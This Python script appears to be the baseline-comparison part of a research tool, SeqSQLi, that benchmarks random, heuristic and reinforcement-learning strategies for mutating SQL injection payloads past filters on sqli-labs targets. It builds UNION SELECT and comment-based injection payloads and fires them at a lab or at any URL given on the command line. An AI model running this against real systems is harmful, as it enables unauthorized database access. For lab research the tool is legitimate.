"""
baseline.py — SeqSQLi v2 (standalone)
======================================
Compares:
1. Random Mutation
2. Static Round-Robin
3. Best Single Heuristic
4. Filter-Aware Heuristic
5. RL Agent (greedy, from Q-table)

Run AFTER training agent.py:
    python baseline.py --less 25
    python baseline.py --less 25 --episodes 100
    python baseline.py --url http://target/vuln.php --param id

This file imports the runtime from the standalone agent.py in the same folder.
"""

import random
import time
import json
import argparse
from collections import Counter

from agent import (
    MUTATIONS, ACTION_LIST, LESS_PRESETS,
    FILTER_MUTATION_HINTS,
    TargetProfile, Fingerprinter,
    send_request, classify_response, encode_state,
    load_q_table, Q, QTABLE_PATH, MAX_STEPS,
    build_target_from_preset, build_target_from_args,
    DEFAULT_BASE_URL, REQUEST_DELAY,
    analyze_ordering,
    # Legacy compat
    LESS_TARGETS, send_payload, analyze_response,
)

TEST_EPISODES = 50

STATIC_SEQUENCE = [
    "comment", "case", "url_encode", "keyword_split",
    "newline", "versioned_comment", "case_split",
    "tab_space", "hex_encode", "paren_space",
]

SINGLE_HEURISTIC = "versioned_comment"


# ============================================================
# BASELINE STRATEGIES
# ============================================================

def run_random(target: TargetProfile, episodes: int) -> list:
    """Uniformly random mutation selection each step."""
    results = []
    for _ in range(episodes):
        payload = target.base_payload
        for step in range(MAX_STEPS):
            action = random.choice(ACTION_LIST)
            mutated = MUTATIONS[action](payload)
            resp, status = send_request(target, mutated)
            result = classify_response(resp, status)
            payload = mutated
            if result == "SUCCESS":
                results.append({"success": True, "steps": step + 1})
                break
            time.sleep(REQUEST_DELAY)
        else:
            results.append({"success": False, "steps": MAX_STEPS})
    return results


def run_static_round_robin(target: TargetProfile, episodes: int) -> list:
    """Fixed cyclic mutation order."""
    results = []
    for _ in range(episodes):
        payload = target.base_payload
        for step in range(MAX_STEPS):
            action = STATIC_SEQUENCE[step % len(STATIC_SEQUENCE)]
            mutated = MUTATIONS[action](payload)
            resp, status = send_request(target, mutated)
            result = classify_response(resp, status)
            payload = mutated
            if result == "SUCCESS":
                results.append({"success": True, "steps": step + 1})
                break
            time.sleep(REQUEST_DELAY)
        else:
            results.append({"success": False, "steps": MAX_STEPS})
    return results


def run_single_heuristic(target: TargetProfile, episodes: int,
                         action_name: str) -> list:
    """Repeatedly apply one mutation type."""
    results = []
    for _ in range(episodes):
        payload = target.base_payload
        for step in range(MAX_STEPS):
            mutated = MUTATIONS[action_name](payload)
            resp, status = send_request(target, mutated)
            result = classify_response(resp, status)
            payload = mutated
            if result == "SUCCESS":
                results.append({"success": True, "steps": step + 1})
                break
            time.sleep(REQUEST_DELAY)
        else:
            results.append({"success": False, "steps": MAX_STEPS})
    return results


def run_filter_heuristic(target: TargetProfile, episodes: int) -> list:
    """Use the filter-specific mutation hints in order (informed static)."""
    hints = FILTER_MUTATION_HINTS.get(target.filter_type, ACTION_LIST[:7])
    results = []
    for _ in range(episodes):
        payload = target.base_payload
        for step in range(MAX_STEPS):
            action = hints[step % len(hints)]
            mutated = MUTATIONS[action](payload)
            resp, status = send_request(target, mutated)
            result = classify_response(resp, status)
            payload = mutated
            if result == "SUCCESS":
                results.append({"success": True, "steps": step + 1})
                break
            time.sleep(REQUEST_DELAY)
        else:
            results.append({"success": False, "steps": MAX_STEPS})
    return results


def run_rl(target: TargetProfile, episodes: int) -> list:
    """RL agent with greedy policy from Q-table.
    Returns results with sequence field for RQ3 ordering analysis."""
    results = []
    for _ in range(episodes):
        payload = target.base_payload
        state = encode_state("INIT", "none", 0, payload)
        sequence = []
        for step in range(MAX_STEPS):
            action = max(ACTION_LIST, key=lambda a: Q[(state, a)])
            mutated = MUTATIONS[action](payload)
            resp, status = send_request(target, mutated)
            result = classify_response(resp, status)
            next_state = encode_state(result, action, step + 1, mutated)
            sequence.append(action)
            payload = mutated
            state = next_state
            if result == "SUCCESS":
                results.append({
                    "success":  True,
                    "steps":    step + 1,
                    "sequence": sequence,
                })
                break
            time.sleep(REQUEST_DELAY)
        else:
            results.append({
                "success":  False,
                "steps":    MAX_STEPS,
                "sequence": sequence,
            })
    return results


# ============================================================
# SUMMARY
# ============================================================

def summarize(name: str, results: list) -> dict:
    total = len(results)
    successes = [r for r in results if r["success"]]
    sr = len(successes) / total * 100 if total else 0
    avg_s = sum(r["steps"] for r in successes) / len(successes) if successes else None
    avg_o = sum(r["steps"] for r in results) / total if total else 0

    print(f"\n  [{name}]")
    print(f"    Success Rate        : {sr:.1f}% ({len(successes)}/{total})")
    if avg_s is not None:
        print(f"    Avg Steps (success) : {avg_s:.2f}")
    else:
        print(f"    Avg Steps (success) : N/A")
    print(f"    Avg Steps (overall) : {avg_o:.2f}")
    print(f"    Failed              : {total - len(successes)}")

    if successes:
        step_counts = Counter(r["steps"] for r in successes)
        dist = ", ".join(f"{s}step:{c}" for s, c in sorted(step_counts.items())[:5])
        print(f"    Step distribution   : {dist}")

    return {
        "method": name,
        "success_rate": round(sr, 1),
        "avg_steps_success": round(avg_s, 2) if avg_s else None,
        "avg_steps_overall": round(avg_o, 2),
        "failed": total - len(successes),
    }


# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SeqSQLi v2 — Baseline Comparison")

    grp = parser.add_mutually_exclusive_group(required=True)
    grp.add_argument("--less", type=float, help="sqli-labs Less level")
    grp.add_argument("--url", type=str, help="Custom target URL")

    parser.add_argument("--param", type=str, default="id")
    parser.add_argument("--method", type=str, default="GET", choices=["GET", "POST"])
    parser.add_argument("--data", type=str, help="Extra POST params")
    parser.add_argument("--base-url", type=str, default=DEFAULT_BASE_URL)
    parser.add_argument("--episodes", type=int, default=TEST_EPISODES)
    parser.add_argument("--no-fingerprint", action="store_true")

    args = parser.parse_args()

    # Build target
    if args.url:
        target = build_target_from_args(args.url, args.param, args.method, args.data)
    else:
        if args.less not in LESS_PRESETS:
            print(f"[!] Less-{args.less} not found. Available: {sorted(LESS_PRESETS.keys())}")
            exit(1)
        target = build_target_from_preset(args.less, args.base_url)

    # Fingerprint or use presets
    if not args.no_fingerprint:
        fp = Fingerprinter(target, verbose=True)
        target = fp.run()
    else:
        target.columns = 3
        target.injectable_cols = [2, 3]
        q = target.quote
        c = target.closure
        ft = target.filter_type
        needs_quote_close = ft in (
            "union_select_comments_spaces",
            "comments_spaces_or_and",
        )
        if target.method == "POST":
            target.base_payload = f"admin{q}{c} --+"
        elif needs_quote_close and q:
            target.base_payload = f"0{q}{c} UNION SELECT 1,2,{q}3"
            target.suffix = "QUOTE_CLOSE"
        else:
            target.base_payload = f"0{q}{c} UNION SELECT 1,2,3--+"

    # Load Q-table
    load_q_table(QTABLE_PATH)

    label = f"Less-{args.less}" if args.less else args.url
    print("\n" + "=" * 60)
    print(f" Baseline Comparison — {label}")
    print(f" Filter       : {target.filter_type}")
    print(f" Base payload : {target.base_payload}")
    print(f" Episodes     : {args.episodes}")
    print("=" * 60)

    print("\n[1/5] Random Mutation...")
    r1 = run_random(target, args.episodes)

    print("[2/5] Static Round-Robin...")
    r2 = run_static_round_robin(target, args.episodes)

    heuristic = SINGLE_HEURISTIC
    print(f"[3/5] Single Heuristic ({heuristic})...")
    r3 = run_single_heuristic(target, args.episodes, heuristic)

    print(f"[4/5] Filter-Aware Heuristic...")
    r4 = run_filter_heuristic(target, args.episodes)

    print("[5/5] RL Agent (SeqSQLi)...")
    r5 = run_rl(target, args.episodes)

    print("\n" + "=" * 60)
    print(" COMPARISON RESULTS")
    print("=" * 60)

    comparison = [
        summarize("Random Mutation", r1),
        summarize("Static Round-Robin", r2),
        summarize(f"Single Heuristic ({heuristic})", r3),
        summarize("Filter-Aware Heuristic", r4),
        summarize("RL Agent (SeqSQLi)", r5),
    ]

    out = f"comparison_less{args.less}.json" if args.less else "comparison.json"
    with open(out, "w") as f:
        json.dump(comparison, f, indent=2)
    print(f"\n[*] Results saved to: {out}")

    # RQ3 ordering analysis on RL sequences
    print("\n" + "=" * 60)
    print(" RQ3 — Ordering Analysis on RL Agent (Baseline Evaluation)")
    print("=" * 60)
    rl_logs = [{"success": r["success"], "steps": r["steps"],
                "sequence": r["sequence"]} for r in r5]
    ordering_out = (
        f"ordering_baseline_less{args.less}.json" if args.less
        else "ordering_baseline.json"
    )
    analyze_ordering(rl_logs, save_path=ordering_out)

    print("=" * 60)
